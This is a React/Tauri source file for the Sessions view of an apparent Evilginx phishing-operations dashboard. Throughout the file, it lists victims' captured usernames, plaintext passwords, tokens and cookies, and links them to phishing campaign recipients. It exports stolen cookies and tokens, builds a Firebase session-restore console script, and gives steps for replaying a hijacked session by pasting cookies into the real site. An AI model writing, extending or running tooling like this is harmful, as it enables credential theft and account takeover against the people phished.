import { useCallback, useEffect, useMemo, useState } from "react";
import { invoke } from "@tauri-apps/api/core";
import {
  captureAccessEpochMs,
  captureHasSessionTokens,
  cookieDomainCount,
  formatAccessTime,
  isEmptyCapture,
  redactCapture,
  sessionTimeline,
} from "./lib/captures";
import { downloadText } from "./lib/download";
import Hint from "./components/Hint";
import EmptyState from "./components/EmptyState";
import { IconInbox } from "./lib/icons";

const FILTERS = [
  { id: "all", label: "All" },
  { id: "creds", label: "Credentials" },
  { id: "tokens", label: "Tokens / cookies" },
  { id: "attributed", label: "Attributed" },
];

const WINDOWS = [
  { id: "0", label: "Any time" },
  { id: "3600000", label: "Last hour" },
  { id: "86400000", label: "Last 24h" },
  { id: "604800000", label: "Last 7d" },
];

/** Evilginx session ids are i64 from Rust. Keep numeric for invoke(); stringify for keys/UI. */
const sid = (c) => {
  const v = c?.evilginx_session_id ?? c?.evilginxSessionId;
  if (v == null || v === "") return null;
  const n = typeof v === "number" ? v : Number(v);
  return Number.isFinite(n) ? n : null;
};
const sidKey = (v) => (v == null || v === "" ? "" : String(v));

function credState(c) {
  const d = c?.data || {};
  return !!((d.username || "").trim() || (d.password || "").trim());
}

/// Focused, self-contained Sessions view for one Target: search/filter, a detail
/// drawer, deterministic campaign attribution, export (cookies.txt / JSON /
/// redacted bundle), and allow-listed incognito replay.
export default function Sessions({
  busy,
  setBusy,
  append,
  profileId,
  focusSessionId = "",
  onOpenResults,
}) {
  const [profile, setProfile] = useState(null);
  const [captures, setCaptures] = useState([]);
  const [attributions, setAttributions] = useState([]);
  const [linkedCampaigns, setLinkedCampaigns] = useState([]);
  const [loading, setLoading] = useState(true);
  const [syncing, setSyncing] = useState(false);
  const [q, setQ] = useState("");
  const [filter, setFilter] = useState("all");
  const [win, setWin] = useState("0");
  const [showEmpty, setShowEmpty] = useState(false);
  const [selectedId, setSelectedId] = useState(null);
  const [consoleHelp, setConsoleHelp] = useState(null);
  const [lastFocus, setLastFocus] = useState("");

  const target = profile?.target_domain || profile?.targetDomain || "";
  const phishlet = profile?.phishlet || "";
  const authMeta = profile?.auth_meta || profile?.authMeta || {};
  const firebaseKey = authMeta.firebase_api_key || authMeta.firebaseApiKey || "";
  const isFirebase =
    (profile?.stack_info?.stack || profile?.stackInfo?.stack) === "firebase";

  const run = async (label, fn) => {
    setBusy(label);
    try {
      return await fn();
    } catch (e) {
      append(`${label}: ${e}`);
      throw e;
    } finally {
      setBusy("");
    }
  };

  useEffect(() => {
    if (!profileId) {
      setProfile(null);
      return;
    }
    invoke("get_profile", { id: profileId }).then(setProfile).catch(() => {});
  }, [profileId]);

  // Background sync: pull fresh sessions out of the evilginx DB. Runs on a
  // worker thread in Rust, so it never blocks the UI; we only surface a subtle
  // "Syncing…" indicator instead of stalling the page.
  const refreshCaptures = useCallback(async () => {
    if (!profileId) return;
    setSyncing(true);
    try {
      const rows = await invoke("sync_captures", { profileId });
      setCaptures(rows || []);
    } catch (e) {
      try {
        const rows = await invoke("list_captures", { profileId });
        setCaptures(rows || []);
      } catch {
        append(String(e));
      }
    } finally {
      setSyncing(false);
    }
  }, [profileId, append]);

  // Paint instantly from the local DB (fast), then sync in the background.
  useEffect(() => {
    if (!profileId) {
      setCaptures([]);
      setLoading(false);
      return undefined;
    }
    let cancelled = false;
    setLoading(true);
    setCaptures([]);
    (async () => {
      try {
        const cached = await invoke("list_captures", { profileId });
        if (!cancelled) setCaptures(cached || []);
      } catch {
        /* the background sync below will surface any real error */
      } finally {
        if (!cancelled) setLoading(false);
      }
      if (!cancelled) refreshCaptures();
    })();
    return () => {
      cancelled = true;
    };
  }, [profileId, refreshCaptures]);

  // Keep sessions fresh in the background without blocking navigation.
  useEffect(() => {
    if (!profileId) return undefined;
    const t = setInterval(refreshCaptures, 3000);
    return () => clearInterval(t);
  }, [profileId, refreshCaptures]);

  // Deterministic attribution + coarse send matches whenever captures change.
  const captureSig = captures.map((c) => `${sid(c)}:${captureAccessEpochMs(c)}`).join(",");
  useEffect(() => {
    if (!profileId) {
      setAttributions([]);
      setLinkedCampaigns([]);
      return;
    }
    Promise.all([
      invoke("attribute_captures", { profileId }).catch(() => []),
      invoke("list_campaigns_for_profile", { profileId }).catch(() => []),
    ])
      .then(([attrs, camps]) => {
        setAttributions(attrs || []);
        setLinkedCampaigns(camps || []);
      })
      .catch(() => {});
  }, [profileId, captureSig]);

  const attrBySid = useMemo(() => {
    const m = new Map();
    for (const a of attributions) {
      const id = a.evilginxSessionId ?? a.evilginx_session_id;
      const key = sidKey(id);
      if (key) m.set(key, a);
    }
    return m;
  }, [attributions]);

  const capturesByCampaign = useMemo(() => {
    const m = new Map();
    for (const a of attributions) {
      const cid = a.campaignId ?? a.campaign_id;
      m.set(cid, (m.get(cid) || 0) + 1);
    }
    return m;
  }, [attributions]);

  // Deep-link focus: open the drawer for a specific session when it arrives.
  // Re-focuses whenever a new focusSessionId is requested from Results.
  useEffect(() => {
    if (!focusSessionId || !captures.length) return;
    if (String(focusSessionId) === lastFocus) return;
    const hit = captures.find((c) => String(sid(c)) === String(focusSessionId));
    if (hit) {
      setSelectedId(sid(hit));
      setLastFocus(String(focusSessionId));
    }
  }, [focusSessionId, captures, lastFocus]);

  const emptyCount = useMemo(
    () => captures.filter(isEmptyCapture).length,
    [captures]
  );

  const rows = useMemo(() => {
    let list = showEmpty ? captures : captures.filter((c) => !isEmptyCapture(c));
    const span = Number(win) || 0;
    if (span > 0) {
      const cut = Date.now() - span;
      list = list.filter((c) => captureAccessEpochMs(c) >= cut);
    }
    if (filter === "creds") list = list.filter(credState);
    else if (filter === "tokens")
      list = list.filter(
        (c) => captureHasSessionTokens(c.data) || cookieDomainCount(c.data) > 0
      );
    else if (filter === "attributed")
      list = list.filter((c) => attrBySid.has(sidKey(sid(c))));
    const term = q.trim().toLowerCase();
    if (term) {
      list = list.filter((c) => {
        const d = c.data || {};
        const a = attrBySid.get(sidKey(sid(c)));
        return [d.username, d.landing_url, d.remote_addr, a?.email, a?.campaignName]
          .filter(Boolean)
          .join(" ")
          .toLowerCase()
          .includes(term);
      });
    }
    return [...list].sort((a, b) => captureAccessEpochMs(b) - captureAccessEpochMs(a));
  }, [captures, showEmpty, win, filter, q, attrBySid]);

  const selected = useMemo(
    () => captures.find((c) => sid(c) === selectedId) || null,
    [captures, selectedId]
  );

  // Escape closes the session detail drawer (it's a side panel, so no focus
  // trap — just dismiss-on-Escape for parity with the app's other overlays).
  useEffect(() => {
    if (!selectedId) return undefined;
    const onKey = (e) => {
      if (e.key === "Escape") setSelectedId(null);
    };
    document.addEventListener("keydown", onKey);
    return () => document.removeEventListener("keydown", onKey);
  }, [selectedId]);

  const copyTokens = async (d) => {
    const custom = d.custom || {};
    const body = d.body_tokens || {};
    const payload = {
      id_token: custom.id_token || d.id_token || body.id_token || "",
      refresh_token: custom.refresh_token || d.refresh_token || body.refresh_token || "",
      access_token: body.access_token || "",
      cookies: d.tokens || {},
      username: d.username || "",
    };
    await navigator.clipboard?.writeText(
      payload.id_token ||
        payload.refresh_token ||
        payload.access_token ||
        JSON.stringify(payload, null, 2)
    );
    append("Token(s) copied to clipboard");
  };

  const saveDownload = async (filename, text, okMsg) => {
    try {
      const path = await downloadText(filename, text);
      if (path) append(okMsg ? `${okMsg} → ${path}` : `Saved ${path}`);
      else append("Save cancelled");
      return path;
    } catch (e) {
      append(`Save failed: ${e}`);
      return null;
    }
  };

  const exportCookies = async (id, format) => {
    const txt = await run("cookies", () =>
      invoke("export_capture_cookies", {
        profileId,
        evilginxSessionId: id,
        format,
      })
    );
    const ext = format === "netscape" ? "cookies.txt" : "cookies.json";
    await saveDownload(`session-${id}-${ext}`, txt, `Exported ${ext}`);
  };

  const exportRedactedBundle = async (c) => {
    const a = attrBySid.get(sidKey(sid(c)));
    const bundle = {
      generated_at: new Date().toISOString(),
      profile: { id: profileId, target, phishlet },
      attribution: a
        ? {
            campaign_id: a.campaignId,
            campaign_name: a.campaignName,
            recipient: a.email,
            tracking_token: a.trackingToken,
            matched_by: a.matchedBy,
          }
        : null,
      session: redactCapture(c),
    };
    await saveDownload(
      `session-${sid(c)}-redacted.json`,
      JSON.stringify(bundle, null, 2),
      "Redacted bundle exported (secrets masked)"
    );
  };

  const exportFullJson = async (c) => {
    await saveDownload(
      `session-${sid(c)}-full.json`,
      JSON.stringify(c?.data || {}, null, 2),
      "Full capture JSON exported"
    );
  };

  const launchReplay = async (d) => {
    if (isFirebase && captureHasSessionTokens(d)) {
      if (!firebaseKey) {
        append("Set a Firebase API key on the Target (Recon → Advanced) before replay");
        return;
      }
      const r = await run("launch", () =>
        invoke("launch_session_replay", {
          capture: d,
          apiKey: firebaseKey,
          targetDomain: target || "",
          phishlet: phishlet || "",
        })
      );
      setConsoleHelp({
        url: r.url || "",
        instructions: r.consoleInstructions || r.console_instructions || r.message,
      });
      append(r.message || "Session replay started");
      return;
    }
    const cookieJson = JSON.stringify(d.tokens || {}, null, 2);
    await navigator.clipboard?.writeText(cookieJson);
    const host = (target || "").replace(/^https?:\/\//, "").split("/")[0];
    const url = host ? `https://${host}/` : "";
    if (url) {
      try {
        const { openUrl } = await import("@tauri-apps/plugin-opener");
        await openUrl(url);
      } catch {
        window.open(url, "_blank");
      }
    }
    setConsoleHelp({
      url,
      instructions: `Cookie map copied.\n\n1. Open the real site${
        url ? ` (${url})` : ""
      } in a fresh incognito window\n2. DevTools → Application → Cookies (or Console)\n3. Paste the cookies for the target origin\n4. Reload`,
    });
    append(url ? `Opened ${url}; cookies JSON copied` : "Cookies JSON copied");
  };

  const copyRestore = async (c) => {
    const d = c?.data || c || {};
    const r = await run("restore", () =>
      invoke("build_restore_script", {
        capture: d,
        apiKey: firebaseKey,
        targetDomain: target || null,
        phishlet: phishlet || null,
      })
    );
    const script = r.script || "";
    try {
      await navigator.clipboard?.writeText(script);
    } catch {
      /* clipboard may be unavailable; file save still works */
    }
    await saveDownload(
      `session-${sid(c) || "restore"}-console.js`,
      script,
      "Console script saved (also copied to clipboard when allowed)"
    );
    setConsoleHelp({
      url: r.loginUrl || r.login_url || "",
      instructions: r.consoleInstructions || r.console_instructions || r.message,
    });
  };

  const deleteCapture = async (id) => {
    await run("del", () =>
      invoke("delete_capture", { profileId, evilginxSessionId: id })
    );
    if (selectedId === id) setSelectedId(null);
    refreshCaptures();
  };

  if (!profileId) {
    return (
      <section className="card">
        <h2>Sessions</h2>
        <EmptyState compact icon={<IconInbox size={20} />} title="No target open">
          Open a Target to inspect its captured Sessions.
        </EmptyState>
      </section>
    );
  }

  return (
    <section className="card sessions" data-testid="sessions-view">
      <div className="sites-header">
        <h2 className="section-head-title">
          Sessions
          <Hint
            hint={`Captured Sessions for ${
              target || "this Target"
            }. Auto-syncs; empty sessions are hidden unless shown. Attribution is by per-lure tracking token, then recipient email.`}
          />
        </h2>
        <div className="row">
          {syncing && !loading && (
            <span className="muted small sync-note">Syncing…</span>
          )}
          <button
            data-testid="sessions-sync"
            disabled={!!busy || syncing}
            onClick={refreshCaptures}
          >
            {syncing ? "Syncing…" : "Sync now"}
          </button>
        </div>
      </div>

      {linkedCampaigns.length > 0 && (
        <div className="linked-campaigns">
          <ul className="list compact">
            {linkedCampaigns.map((c) => (
              <li key={c.id}>
                <span className="truncate" title={c.name}>{c.name}</span>
                <span className="tag">{c.status}</span>
                <span className="small muted">
                  {c.sent} sent · {capturesByCampaign.get(c.id) || 0} captured
                </span>
                {onOpenResults && (
                  <button
                    type="button"
                    className="ghost"
                    onClick={() => onOpenResults(c.id)}
                  >
                    Results →
                  </button>
                )}
              </li>
            ))}
          </ul>
        </div>
      )}

      <div className="sessions-toolbar">
        <input
          type="search"
          data-testid="sessions-search"
          className="grow"
          placeholder="Search user, email, campaign, IP, landing URL…"
          value={q}
          onChange={(e) => setQ(e.target.value)}
        />
        <select
          data-testid="sessions-window"
          value={win}
          onChange={(e) => setWin(e.target.value)}
          aria-label="Time window"
        >
          {WINDOWS.map((w) => (
            <option key={w.id} value={w.id}>
              {w.label}
            </option>
          ))}
        </select>
        <label className="check">
          <input
            type="checkbox"
            data-testid="sessions-show-empty"
            checked={showEmpty}
            onChange={(e) => setShowEmpty(e.target.checked)}
          />
          Empty{emptyCount ? ` (${emptyCount})` : ""}
        </label>
        {showEmpty && emptyCount > 0 && (
          <button
            className="ghost"
            disabled={!!busy}
            onClick={() =>
              run("prune", () => invoke("prune_captures", { profileId })).then(
                refreshCaptures
              )
            }
          >
            Prune empty
          </button>
        )}
      </div>

      <div className="filter-chips">
        {FILTERS.map((f) => (
          <button
            key={f.id}
            type="button"
            data-testid={`sessions-filter-${f.id}`}
            className={`chip ${filter === f.id ? "active" : ""}`}
            onClick={() => setFilter(f.id)}
          >
            {f.label}
          </button>
        ))}
      </div>

      {consoleHelp && (
        <div className="console-help">
          <strong>Console paste (if replay does not restore automatically)</strong>
          <pre className="hint-panel">{consoleHelp.instructions}</pre>
          {consoleHelp.url && <p className="mono small">Target: {consoleHelp.url}</p>}
          <button type="button" className="ghost" onClick={() => setConsoleHelp(null)}>
            Dismiss
          </button>
        </div>
      )}

      <div className={`sessions-layout ${selected ? "with-drawer" : ""}`}>
        <table className="sessions-table">
          <thead>
            <tr>
              <th>#</th>
              <th>Accessed</th>
              <th>User</th>
              <th>Signals</th>
              <th>Attribution</th>
            </tr>
          </thead>
          <tbody>
            {loading && !rows.length
              ? Array.from({ length: 6 }).map((_, i) => (
                  <tr key={`sk-${i}`} className="skeleton-row" aria-hidden="true">
                    <td>
                      <span className="skeleton" style={{ width: "2rem" }} />
                    </td>
                    <td>
                      <span className="skeleton" style={{ width: "6rem" }} />
                    </td>
                    <td>
                      <span className="skeleton" style={{ width: "9rem" }} />
                    </td>
                    <td>
                      <span className="skeleton" style={{ width: "5rem" }} />
                    </td>
                    <td>
                      <span className="skeleton" style={{ width: "7rem" }} />
                    </td>
                  </tr>
                ))
              : rows.map((c) => {
              const d = c.data || {};
              const id = sid(c);
              const a = attrBySid.get(sidKey(id));
              const hasTok = captureHasSessionTokens(d);
              const cookieN = cookieDomainCount(d);
              return (
                <tr
                  key={id}
                  className={`${selectedId === id ? "selected" : ""} ${
                    isEmptyCapture(c) ? "capture-empty" : ""
                  }`}
                  onClick={() => setSelectedId(id)}
                >
                  <td>{id}</td>
                  <td className="small">{formatAccessTime(c)}</td>
                  <td className="mono" title={d.username || ""}>{d.username || "—"}</td>
                  <td className="small">
                    {credState(c) && <span className="tag small">creds</span>}
                    {hasTok && <span className="tag small">tokens</span>}
                    {cookieN > 0 && <span className="tag small">{cookieN} cookie</span>}
                    {!credState(c) && !hasTok && cookieN === 0 && "—"}
                  </td>
                  <td className="small">
                    {a ? (
                      <span
                        className="tag"
                        title={`${a.campaignName} — matched by ${a.matchedBy}`}
                      >
                        {a.campaignName}
                      </span>
                    ) : (
                      "—"
                    )}
                  </td>
                </tr>
              );
            })}
          </tbody>
        </table>

        {selected && (
          <SessionDrawer
            capture={selected}
            attribution={attrBySid.get(sidKey(sid(selected)))}
            phishlet={phishlet}
            isFirebase={isFirebase}
            busy={busy}
            onClose={() => setSelectedId(null)}
            onLaunch={() => launchReplay(selected.data || {})}
            onCopyTokens={() => copyTokens(selected.data || {})}
            onCookiesTxt={() => exportCookies(sid(selected), "netscape")}
            onCookiesJson={() => exportCookies(sid(selected), "json")}
            onCopyRestore={() => copyRestore(selected)}
            onRedacted={() => exportRedactedBundle(selected)}
            onFullJson={() => exportFullJson(selected)}
            onDelete={() => deleteCapture(sid(selected))}
            onOpenResults={
              onOpenResults && attrBySid.get(sidKey(sid(selected)))
                ? () =>
                    onOpenResults(
                      attrBySid.get(sidKey(sid(selected))).campaignId
                    )
                : null
            }
          />
        )}
      </div>

      {loading && !rows.length && (
        <p className="muted">Loading captured Sessions…</p>
      )}

      {!loading && !rows.length && (
        <p className="muted">
          {captures.length && !showEmpty
            ? `${captures.length} empty session(s) hidden — toggle Empty to show, or adjust filters.`
            : "No captured Sessions yet — they appear automatically after a lure hit."}
        </p>
      )}
    </section>
  );
}

function SessionDrawer({
  capture,
  attribution,
  phishlet,
  isFirebase,
  busy,
  onClose,
  onLaunch,
  onCopyTokens,
  onCookiesTxt,
  onCookiesJson,
  onCopyRestore,
  onRedacted,
  onFullJson,
  onDelete,
  onOpenResults,
}) {
  const d = capture.data || {};
  const custom = d.custom || {};
  const hasTok = captureHasSessionTokens(d);
  const cookieN = cookieDomainCount(d);
  const timeline = sessionTimeline(capture, attribution);
  const [showPw, setShowPw] = useState(false);

  return (
    <aside className="session-drawer">
      <div className="drawer-head">
        <h3>Session {sid(capture)}</h3>
        <button type="button" className="icon-btn" onClick={onClose} aria-label="Close">
          ✕
        </button>
      </div>

      {attribution ? (
        <div className="attribution-card">
          <span className="tag">{attribution.campaignName}</span>
          <span className="muted small">
            {attribution.email} · matched by {attribution.matchedBy}
          </span>
          {onOpenResults && (
            <button type="button" className="linkish" onClick={onOpenResults}>
              Open in Results →
            </button>
          )}
        </div>
      ) : (
        <p className="muted small">Not yet attributed to a campaign recipient.</p>
      )}

      <div className="timeline">
        <strong>Timeline</strong>
        <ol>
          {timeline.map((ev, i) => (
            <li key={`${ev.label}-${i}`}>
              <span className="tl-label">{ev.label}</span>
              <span className="tl-detail mono small">{ev.detail}</span>
            </li>
          ))}
        </ol>
      </div>

      <dl className="capture-details">
        <div>
          <dt>Accessed</dt>
          <dd>{formatAccessTime(capture)}</dd>
        </div>
        <div>
          <dt>Username</dt>
          <dd className="mono" title={d.username || ""}>{d.username || "—"}</dd>
        </div>
        <div>
          <dt>Password</dt>
          <dd className="mono reveal-field">
            {d.password ? (
              <>
                <span className="reveal-value" title={showPw ? d.password : ""}>
                  {showPw ? d.password : "••••••••"}
                </span>
                <button
                  type="button"
                  className="linkish"
                  onClick={() => setShowPw((v) => !v)}
                >
                  {showPw ? "Hide" : "Show"}
                </button>
                <button
                  type="button"
                  className="linkish"
                  onClick={() => navigator.clipboard?.writeText(d.password)}
                >
                  Copy
                </button>
              </>
            ) : (
              "—"
            )}
          </dd>
        </div>
        <div>
          <dt>IP</dt>
          <dd className="mono" title={d.remote_addr || ""}>{d.remote_addr || "—"}</dd>
        </div>
        <div>
          <dt>User-Agent</dt>
          <dd className="small" title={d.useragent || d.user_agent || ""}>
            {(d.useragent || d.user_agent || "—").slice(0, 200)}
          </dd>
        </div>
        <div>
          <dt>Landing</dt>
          <dd className="mono small truncate" title={d.landing_url || ""}>
            {d.landing_url || "—"}
          </dd>
        </div>
        <div>
          <dt>Phishlet</dt>
          <dd className="mono">{d.phishlet || phishlet || "—"}</dd>
        </div>
        <div>
          <dt>Tokens</dt>
          <dd>
            {hasTok
              ? [
                  custom.id_token || d.id_token ? "id_token" : null,
                  custom.refresh_token || d.refresh_token ? "refresh_token" : null,
                  d.body_tokens?.access_token ? "access_token" : null,
                ]
                  .filter(Boolean)
                  .join(", ") || "yes"
              : "none"}
            {cookieN ? ` · cookies on ${cookieN} domain(s)` : ""}
          </dd>
        </div>
      </dl>

      <div className="drawer-actions">
        {(hasTok || cookieN > 0) && (
          <button className="ghost" disabled={!!busy} onClick={onLaunch}>
            Replay (incognito)
          </button>
        )}
        {(hasTok || cookieN > 0) && (
          <button className="ghost" disabled={!!busy} onClick={onCopyTokens}>
            Copy token
          </button>
        )}
        {cookieN > 0 && (
          <button className="ghost" disabled={!!busy} onClick={onCookiesTxt}>
            cookies.txt
          </button>
        )}
        {cookieN > 0 && (
          <button className="ghost" disabled={!!busy} onClick={onCookiesJson}>
            cookies.json
          </button>
        )}
        {isFirebase && hasTok && (
          <button className="ghost" disabled={!!busy} onClick={onCopyRestore}>
            Download console script
          </button>
        )}
        <button className="ghost" disabled={!!busy} onClick={onRedacted}>
          Download redacted bundle
        </button>
        <button className="ghost" disabled={!!busy} onClick={onFullJson}>
          Download full JSON
        </button>
        <button className="ghost danger" disabled={!!busy} onClick={onDelete}>
          Delete
        </button>
      </div>
    </aside>
  );
}
